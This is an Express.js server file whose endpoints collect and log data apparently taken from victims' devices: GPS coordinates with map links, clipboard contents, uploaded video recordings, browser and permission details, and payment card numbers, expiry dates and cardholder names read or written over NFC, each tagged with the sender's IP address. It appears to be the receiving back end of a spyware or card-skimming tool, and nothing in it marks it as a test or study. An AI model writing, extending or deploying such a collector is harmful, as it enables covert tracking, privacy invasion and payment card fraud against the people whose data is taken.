const express = require('express');
const app = express();
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const uploadPath = path.join(__dirname, 'uploads');

// Create the 'uploads' directory if it doesn't exist
if (!fs.existsSync(uploadPath)) {
  fs.mkdirSync(uploadPath);
}

app.use(express.json());
app.use(cors());

// Endpoint to receive geolocation data
app.post('/receive-location', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date().toISOString();
  const { latitude, longitude, mapLink } = req.body;

  console.log(`Received location data at ${timestamp}`);
  console.log(`IP Address: ${ip}`);
  console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
  console.log(`Map Link: ${mapLink}`);

  res.json({
    status: 'Location received',
    timestamp,
    ip,
    latitude,
    longitude,
    mapLink,
  });
});

// Endpoint to receive clipboard content
app.post('/receive-clipboard', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date().toISOString();
  const clipboardContent = req.body.clipboardContent || 'No content';

  console.log(`Received clipboard content at ${timestamp}`);
  console.log(`IP Address: ${ip}`);
  console.log(`Clipboard Content: ${clipboardContent}`);

  res.json({ status: 'Clipboard received', timestamp, ip, clipboardContent });
});

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(
      null,
      file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname)
    );
  },
});
const upload = multer({ storage: storage });

// Endpoint to receive video uploads
app.post('/upload-video', upload.single('video'), (req, res) => {
  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  console.log(`Received video upload at ${timestamp}`);
  console.log(`IP Address: ${ip}`);
  console.log(`Saved file: ${req.file.path}`);

  res.json({
    status: 'Video received',
    timestamp,
    ip,
    filePath: req.file.path,
  });
});

// Endpoint to receive written NFC data
app.post('/receive-nfc-write', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date().toISOString();
  const { cardNumber, expiryDate, cardholderName } = req.body;

  console.log(`Received NFC write data at ${timestamp}`);
  console.log(`IP Address: ${ip}`);
  console.log(`Card Number: ${cardNumber}`);
  console.log(`Expiry Date: ${expiryDate}`);
  console.log(`Cardholder Name: ${cardholderName}`);

  res.json({
    status: 'NFC write data received',
    timestamp,
    ip,
    cardNumber,
    expiryDate,
    cardholderName,
  });
});

// Endpoint to receive read NFC data
app.post('/receive-nfc-read', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date().toISOString();
  const nfcData = req.body;

  console.log(`Received NFC read data at ${timestamp}`);
  console.log(`IP Address: ${ip}`);
  console.log(`NFC Data:`, nfcData);

  res.json({
    status: 'NFC read data received',
    timestamp,
    ip,
    nfcData,
  });
});

// Endpoint to receive platform and browser information
app.post('/receive-platform', (req, res) => {
  const timestamp = new Date().toISOString();
  const {
    platform = 'Unknown',
    browser = 'Unknown',
    permissions = [],
  } = req.body;

  const userAgent = req.headers['user-agent'];
  console.log(`Received platform info at ${timestamp}`);
  console.log(`Platform: ${platform}`);
  console.log(`Browser: ${browser}`);
  console.log(`User-Agent: ${userAgent}`);
  console.log(`Permissions:`, permissions);

  res.json({
    status: 'Platform info received',
    timestamp,
    platform,
    browser,
    userAgent,
    permissions,
  });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
